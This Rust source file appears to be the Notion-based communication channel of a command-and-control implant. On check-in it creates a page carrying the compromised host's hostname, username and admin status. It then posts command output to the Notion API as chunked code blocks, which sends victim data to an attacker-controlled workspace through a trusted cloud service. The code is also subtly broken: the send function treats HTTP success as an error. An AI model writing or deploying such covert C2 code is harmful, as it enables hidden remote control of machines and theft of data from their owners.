use crate::channels::{Channel, ChannelError};
use crate::cmd::command_out;
use serde::{Serialize, Deserialize};
use base64::encode;
use reqwest::Client;
use reqwest::header::{HeaderMap, AUTHORIZATION, CONTENT_TYPE};
use serde_json::{json, from_value, from_str, to_string, Value};
use async_trait::async_trait;
use crate::logger::*;
use crate::env_check::EnvCheck;
use whoami::hostname;
use crate::cmd::getprivs::is_elevated;

/// This is a Notion limitation
const CHUNK_SIZE: usize = 2000;

/// Base Notion API URL
const URL_BASE: &str = "https://api.notion.com/v1";

#[derive(Debug, Serialize, Deserialize)]
pub struct NotionConfig {
    pub api_key: String,
    pub parent_page_id: String,
    pub page_id: String,
}

#[derive(Debug, Serialize, Deserialize)]
pub struct NotionChannel {
    pub config: NotionConfig,
    #[serde(skip_serializing)]
    pub logger: Logger,
    #[serde(skip_serializing, skip_deserializing)]
    pub client: Client
}

// impl Serialize for NotionChannel {
//     fn serialize<S>(&self, serializer: S) -> Result<S::Ok, S::Error>
//     where
//         S: Serializer,
//     {
//         // 3 is the number of fields in the struct.
//         let mut state = serializer.serialize_struct("NotionChannel", 1)?;
//         state.serialize_field("config", &self.config)?;
//         state.end()
//     }
// }






impl NotionChannel {

    ///
    /// Constructor for [NotionChannel]
    /// 
    async fn new(config_str: String, is_admin: bool) -> Result<NotionChannel, ChannelError> {

        // Deserialize the JSON into a proper NotionConfig
        if let Ok(config) = from_str::<NotionConfig>(&config_str) {
            let logger = Logger::new(LOG_DEBUG);
            
            let client = NotionChannel::client(&config.api_key)?;
            
            Ok(NotionChannel {config, logger, client})

        } else {
            
            Err(ChannelError::new("Could not load Notion Config"))
        }

    }

    ///
    /// Generates an ad-hoc client for use with the Notion API.
    /// The client cannot be part of the `NotionChannel` struct because
    /// [Deserialize] is not implemented for [Client], and we need the entirety of the struct
    /// to be Json-ifiable.
    /// 
    /// So while we pay a minor memory and speed cost for spinning this up with each request,
    /// it's better than a global client getting passed around everywhere.
    /// 
    fn client(api_key: &str) -> Result<Client, ChannelError> {
        let mut headers = HeaderMap::new();

        headers.insert("Notion-Version", "2021-08-16".parse().unwrap());
        headers.insert(CONTENT_TYPE, "application/json".parse().unwrap());
        headers.insert(AUTHORIZATION, format!("Bearer {}", api_key).parse().unwrap());

        Ok(Client::builder()
            .default_headers(headers)
            .build().unwrap()
        )
    }

}

#[async_trait]
impl Channel for NotionChannel {

    ///
    /// Utility function for creating Notion Pages
    /// Used during the build of a new [NotionChannel] in `NotionChannel::init
    /// 
    async fn init(self) -> Result<String, ChannelError> {
        self.logger.info(format!("Creating page..."));

        // Initialize the client to send
        let client = NotionChannel::client(&self.config.api_key);

        // Get hostname
        let mut hn = hostname();

        let is_admin = is_elevated();  

        // Get username
        let username = whoami::username();
        hn.push_str(" | ");
        hn.push_str(&username);

        self.logger.info(format!("Admin context: {}", is_admin));
        if is_admin {
            hn.push_str("*");
        }

        let url = format!("{}/pages/", URL_BASE);
        
        let mut check_in_emoji: String = "".to_string();

        let is_admin = is_elevated();

        let check_in_emoji = match is_admin {
            true  => "#️⃣",
            false => "💲"
        };

        // let page_id = NotionChannel::create_page(&logger, &hn, is_admin)
        //     .await
        //     .unwrap();

        // Craft JSON Body
        let body: serde_json::Value = json!({
            "parent": {
                "type": "page_id",
                "page_id": self.config.parent_page_id
            },
            "icon": {
                "type": "emoji",
                "emoji": &check_in_emoji
            },
            "properties": {
                "title": [{
                    "text": {
                        "content": hn
                    }
                }]
            }
        });
        let r = self.client
            .post(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        if r.status().is_success() {
            let res_body = r.json::<serde_json::Value>().await.unwrap();
            return Ok(String::from(res_body["id"].as_str().unwrap()));
        }


        let result_text = r.text().await.unwrap();
        self.logger.debug(result_text);
        Ok(result_text)    

    }

    async fn send(self, data: String, command_block_id: &str) -> Result<String, ChannelError> {

        self.logger.debug(format!("{data}"));
        let chunks:Vec<serde_json::Value> = data
            .as_bytes()
            .chunks(CHUNK_SIZE)
            .map(|c| json!({
                "object": "block",
                "type": "code",
                "code": {
                    "text": [{
                        "type": "text",
                        "text": { "content": String::from_utf8(c.to_vec()).unwrap()},
                        "annotations": {"code": false}
                    }],
                    "language": "plain text"
                }
            }))
            .collect();


        let url = format!("{URL_BASE}/blocks/{command_block_id}/children");
        let body : serde_json::Value = json!({
            "children": chunks
        });
        let r = self.client
            .patch(url)
            .json(&body)
            .send()
            .await
            .unwrap();
        
        let result_text = r.text().await.unwrap();
        if !r.status().is_success() {
            self.logger.debug(result_text);
            Ok(result_text)
        } else {
            Err(ChannelError::new(&result_text))
        }
    }

    async fn receive(self) -> Result<Value, ChannelError> {
        Ok(json!({}))
    }

    /// Produces a base64 encoded String of the Options.
    ///
    /// This is useful for sending ConfigOptions to launch commands
    /// 
    fn to_base64(self) -> String {
        encode(to_string(&self.config).unwrap().as_bytes())
    }

    fn update(self, options: String) -> Result<String, ChannelError> {

        command_out!("Config updated")
    }

}

